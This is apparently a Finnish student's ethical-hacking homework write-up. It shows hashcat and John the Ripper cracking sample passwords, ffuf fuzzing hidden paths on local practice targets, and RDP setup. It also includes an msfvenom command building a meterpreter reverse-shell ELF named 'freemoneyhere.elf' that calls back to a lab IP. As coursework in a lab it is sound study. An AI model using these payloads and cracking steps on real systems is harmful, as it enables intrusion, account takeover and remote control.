# h3 Fuff faster

## a) Asenna Hashcat ja testaa sen toiminta murtamalla esimerkkisalasana.

Esimerkki hash on `6b1628b016dff46e6fa35684be6acc96`

Kali Linuxissa hashcat on jo valmiiksi asennettuna

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/f9206b05-00dd-4f9c-b88c-2512926396e1)

Mutta sen voi myös asentaa itse komennolla

    $ sudo apt install hashcat

"rockyou" sanalistakin on valmiiksi ladattu kaliin

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/6abe1f3f-51f6-4baf-b206-f0571174dafe)

puretaan pakattu tiedosto komennolla

    $ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/b8dc68df-b172-4785-a152-ac9b553f32a0)

Seuraavaksi katsotaan `hashid`:n avulla minkälainen hash esimerkki salasana on komennolla

    $ hashid -m <hash>

Komennossa `-m` komento antaa `hashcat`:tissä käytettävän moodin

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/18392ad9-c025-4744-9485-06dcaf26125d)

koska `hashcat`:tilla ei voi murtaa `MD2` tyyppisiä hasheja aloitetaan `MD5` komennolla

    $ hashcat -m 0 '6b1628b016dff46e6fa35684be6acc96' /usr/share/wordlists/rockyou.txt

Valitaan `-m` parametrilla hashin tyyppi, annetaan hash ja sanalista

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/1bb76e4e-526a-4715-bb1e-b68a9c86a5d2)

Salasana selvisi ja se on `summer`

## b) Salainen, mutta ei multa. Ratkaise [dirfuzt-1](https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/)

Ladataan dirtfuzt-1 komennolla

    $ wget https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/dirfuzt-1

Tehdään niin että binaari voidaan käynnistää komennolla 

    $ chmod u+x dirfuzt-1

Käynnistetään binaari komennolla

    $ ./dirfuzt-1

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/f882aa30-68ca-4b94-9e43-88c6881b1a2e)

Mennään kuvassa näkyvään osoitteeseen `http://127.0.0.2:8000`

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/40ba7695-e60c-48f6-884c-ed2d6bf2cdc6)

Ladataan [SecList](https://github.com/danielmiessler/SecLists) sanalista komennolla

    $ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt

käytetään ffuf:fia luomaamme harjoitus kohteeseen komennolla

    $ ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ 

`-w` parametrilla valitaan sanalista ja `-u` parametrilla valitaa harjoituskohteen osoite `FUZZ` tarkoittaa avain sanaa jonka tilalle tulee vuorotelen joka-ainut sana meidän listasta esimerkiksi, jos sanalistassa on sana "auto" niin `ffuf` kokeilee osoitetta `http://127.0.0.2:8000/auto`

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/58608c99-3cff-46bc-858d-5ac8ba076d65)

Kun käytämme `ffuf`:fia niin huomaamme että se antaa tosi paljon samanlaisia tuloksia (sama status, koko jne) voimme filtteröidä tulosta esimerkiksi siten että `ffuf` ei näytä tuloksia joiden koko on 154 parametrilla `-fs`. Uusi komento on 

    $ ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ -fs 154

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/47714a5c-5ad5-4536-8e15-5d10f049c857)

Nyt `ffuf` näyttää tuloksia, jotka oikeasti johtavat johonkin esimerkiksi

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/40e7185b-02af-465d-a7e1-d0840a5240ce)

### Tuloksen selitys:

- `Status` näyttää http vastaus koodin tässä tapauksessa koodi `200` tarkoittaa että yhteys oli onnistunut. [HTTP response status codes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)
- `Size` näyttää http vastauksen koon eli tässä tapauksessa `182` tavua
- `Words` näyttää montako sanaa sivulla on
- `Lines` näyttää montako riviä sivun `html` dokumentissa on
- `Duration` näyttää kaunako sivulla kestää vastata

Tehtävä oli löytää:

[![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/08e7c999-ae43-4eb3-865c-e26178ec67a0)
](https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/)

Admin sivu on `http://127.0.0.2:8000/wp-admin`

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/073ac3b6-8cfe-4f49-8436-c4f76d6f97e4)

Version hallintaan liittyvä sivu on `http://127.0.0.2:8000/.git/`

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/dd96bcc4-94c5-48e2-a746-1f4aa3737b27)

## c) Asenna John the Ripper ja testaa sen toiminta murtamalla jonkin esimerkkitiedoston salasana.

`John the Ripper` on valmiiksi asennettu kaliin, mutta jos ei ole sen voi asentaa komennolla 

    $ sudo apt install john

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/5cb6f352-1e36-4673-9ed5-40395d7a7dcb)

Käytetään tehtävässä [Teron sivuilta](https://terokarvinen.com/2023/crack-file-password-with-john/) löytyvää harjoitus [zippiä](https://terokarvinen.com/2023/crack-file-password-with-john/tero.zip)

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/8d39e0e5-091f-4c05-812d-529a44159813)

napataan `hash` tiedostosta komennolla ja siirretään se tiedostoon nimeltä `hash`

    $ zip2john tero.zip > hash

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/da003ad8-b65d-47fa-9e63-e01e9d894415)

Tämän jälkeen koitetaan murtaa salasana komennolla

    $ john hash

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/d9183a3d-569f-46a7-9f53-3b171374cb02)

`Rip the John`:nin mielestä salasan on `butterfly`

Kokeillaan:

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/ae9d6756-de0b-438e-b7b1-e8394098260c)

## d) Fuffme. Asenna Ffufme harjoitusmaali paikallisesti omalle koneellesi. Ratkaise tehtävät (kaikki paitsi ei "Content Discovery - Pipes")

[Ohjeet](https://terokarvinen.com/2023/fuffme-web-fuzzing-target-debian/)

Kalissa on jo `ffuf` ja `git` asennettuna, joten pitää asentaa vain `docker.io` komennolla

    $ sudo apt install docker.io

kloonataan `ffufme` repositorio komennolla

    $ git clone https://github.com/adamtlangley/ffufme

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/479070d6-ec47-4c0f-90fd-026578590c91)

Siirrytään `ffufme` kansioon

Rakennetaan `docker image` komennolla 

    $ sudo docker build -t ffufme .

`-t` parametrilla nimetään `image` "ffufme" ja `.` tarkoittaa sitä, että image rakennetaan tiedostoilla jotka ovat nykyisessa kansiossa

Käynnistetään docker image komennolla 

    $ sudo docker run -d -p 80:80 ffufme

`-d` parametri tekee niin että docker container pyörii taustalla eikä jää siihen terminaali ikkunaan `-p` parametrilla määritellään mitkä portit on liitetty toisiinsa

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/93cd1624-8998-41b4-a7e3-41f54d60629f)

Nyt jos menemme selaimella osoitteeseen `http://localhost` tämä sivu aukeaa

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/96d53d89-f99e-402e-a58f-1344bffe92d8)

Sitten luodaan kansio ja ladataan tarvittavat sanalistat

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/cfbfbb17-57af-4f75-8ec9-fdca57462818)

### Content Discovery - Basic

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/0237084b-d8b1-4099-a3b2-0069b796ed43)

Tehtävässä pitää löytää tiedostot `class` ja `development.log`

Komento:

    $ ffuf -w common.txt -u http://localhost/cd/basic/FUZZ

Valitaan `-w` parametrilla sanalista ja `-u` parametrilla sivu, jota fuzzataan

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/5256e28f-62eb-4f70-89a8-e678e4b00136)

Halutut tiedostot löytyivät!!!

### Content Discovery - Recursion

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/a78b4c6d-ca32-471a-a24c-576b049e8a71)

Tässä tehtävässä tarkoituksen on käyttää `-recursion` parametria, joka tekee sen että jos `ffuf` löytää kansion se käynnistää toisen skannauksen siinä kansiossa

Tarkoituksen on löytää `admin` `admin/user` `admin/user/96`

Komento: 

    $ ffuf -w ~/wordlists/common.txt -recursion -u http://localhost/cd/recursion/FUZZ

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/6388862e-b8f8-4d8f-8999-75a87019d564)

Halutut asiat löytyivät!!

### Content Discovery - File Extensions

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/e95ed380-eeb3-4c79-9f85-3bc82a9c5d36)

Tässä tehtävässä tarkoituksena on löytää `logs/users.log` `ffuf`:fissa voi etsiä tiedostopäätteen avulla parametrilla `-e`

Komento:

    $ ffuf -w ~/wordlists/common.txt -e .log -u http://localhost/cd/ext/logs/FUZZ

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/f577cc0b-b050-481c-987e-9fad4e14b251)

Haluttu tiedosto löytyi!!!

### Content Discovery - No 404 Status

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/96dceaaf-8658-4f8b-9eb7-94557a7480ef)

Tehtävässä on tarkoitus filtteröidä `-fs` parametrilla tuloksesta pois kaikki väärät tulokset tarkoituksen on löytää tiedosto `secret`

Kokeillaan `ffuf`:fia ensiksi komennolla

    $ ffuf -w ~/wordlists/common.txt -u http://localhost/cd/no404/FUZZ

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/fa142dd5-ff47-4fbb-a85f-fb9bd560669a)

Sivusto palauttaa kaikista sanalistan sanoista http koodin 200 eli meidän pitää filtteröidä väärät tulokset pois ja tämän voimme tehdä koon perusteella, sillä kaikkien koko näyttää olevan 669 tavua `-fs 669`

Komento: 

    $ ffuf -w ~/wordlists/common.txt -u http://localhost/cd/no404/FUZZ -fs 669

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/c23e90c7-0678-40f5-98bb-8fcd748ab9c5)

Haluttu tiedosto löytyi!!!

### Content Discovery - Param Mining

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/06e99b91-824f-4de4-bc65-b74bd7137476)

Tehtävän tarkoituksena on löytää data parametri `debug`

Komento:

    $ ffuf -w ~/wordlists/parameters.txt -u http://localhost/cd/param/data?FUZZ=1

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/ff563eb8-3da9-4ee8-9b0d-10e39afa421a)

### Content Discovery - Rate Limited

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/5796bcf3-3159-49b4-89f7-daaf7b4e87b3)

Tässä tehtävässä on tarkoituksena rajoittaa pyyntöjä mitä lähetetään serverille

Komento:

    $ ffuf -w ~/wordlists/common.txt -t 5 -p 0.1 -u http://ffuf.test/cd/rate/FUZZ -mc 200,429

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/9f9caa15-f9f1-4dbb-a3f8-e21e9a27085a)

### Subdomains - Virtual Host Enumeration

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/e51781b3-e1a9-414b-a498-873dc0d2fb63)

Komento:

    $ ffuf -w ~/wordlists/subdomains.txt -H "Host: FUZZ.ffuf.me" -u http://localhost -fs 1495

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/25927c81-1640-461a-9173-dbbaefe31a36)

## e) Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell).

Tehdään `msfvenom` työkalulla payload joka soittaa kotiin komennolla

    $ sudo msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.56.103 lport=1234 -f elf > freemoneyhere.elf

`-p` parametrilla valitaan `payloadi` `lhost` ja `lport` laitetaan tietokoneen portti ja ip johon payloadi ottaa yhteyden `-f` parametrilla valitaan tiedosto formaatti eli tässä tapauksessa `elf` ja `> freemoneyhere.elf` kertoo että minkä niminen tiedostosta tulee

sitten komennolla `$ chmod +x freemoneyhere.elf` tehdään tiedostosta käynnistettävä

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/f2ffd842-5b22-4a97-bcdf-48257d631437)

sitten avataan `metasploit` komennolla

    $ sudo msfconsole

Käytetään `metasploitissa` `multi/handler` työkalua, joka kuuntelee tulevia yhteyksiä

    $ use exploit/multi/handler

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/f5433bb1-19eb-473d-bd28-cd60251f7fe4)

Laitetaan kaikki samat tiedot `lport` ja `lhost` kohtaan kuin laitoimme payloadiin

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/1b375f60-952a-4209-b757-372716f216d7)

Määritellään myös sama payloadi

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/cfba341d-eca4-40e4-83f3-fb935db85048)

Sitten aloiteen kuuntelu komennolla

    $ exploit

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/0c59274a-ba30-4b1a-a24d-37d043433760)

Toisessa terminaalissa käynnistetään tekemämme payloadi komennolla

    $ ./freemoneyhere.elf

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/c01ebbf4-77f9-47c7-81b4-b42e5ce81a61)

Ja nyt huomaamme että `metasploit` ikkunassa avautui `meterpeter` sessio

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/bed2b125-057d-4d75-a950-722cc7754c5a)

## f) Asenna Windows virtuaalikoneeseen.

Ladataan Windows image tiedosto osoitteesta https://www.microsoft.com/software-download/windows11 

Valitaan `VirtualBoxissa` `New` vaihtoehto

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/b5fbee6d-1245-44e6-a7a2-5b9c64a263c6)

Valitaan virtuaalikoneelle nimi ja valitaan lataamamme image muista valita `skip unattented installation`

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/6f4acef5-6709-4e20-9c50-565578694515)

Määritellään `ramin` määrä ja prosessorit

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/5fc8c094-c678-485f-8bb2-50f9cbfc474a)

Määritellään levyn suuruus

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/1433a970-077a-453b-a4c3-df6e9534bc91)

Ja asennetaan windows ihan normaalisti

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/a2053da4-518e-4cb0-98a2-e3970ffafd0e)

Jos haluat skipata Windows käyttäjän voit avata `cmd` ikkunan painamalla Shift + F10 ja laittamalla siihen komennon

    > OOBE\BYPASSNRO´

Muista varmistaa että et ole yhdistettynä nettiin

## g) Ota Windowsiin graafinen etähallintayhteys Linuxista.

Mene `windows` koneella asetuksiin System > Remote Desktop ja laita se päälle

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/9663db1d-7c55-42ec-a804-3f89b13b01f1)

Muista ottaa tämä pois

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/314fffd0-1e60-42c5-9ccf-3b76883a6b24)

Sitten suorita linuxilla komento

    $ rdesktop 192.168.56.104

![image](https://github.com/EetHeet/Tunkeutumistestaus/assets/164857391/8dc11ee6-4b2f-4063-bdbf-1f25ea510d44)


## Lähteet

Tehtävät: https://terokarvinen.com/2024/eettinen-hakkerointi-2024/

Msfvenom: https://www.youtube.com/watch?v=ZqWfDrD2WVY

https://www.kali.org/tools/rdesktop/
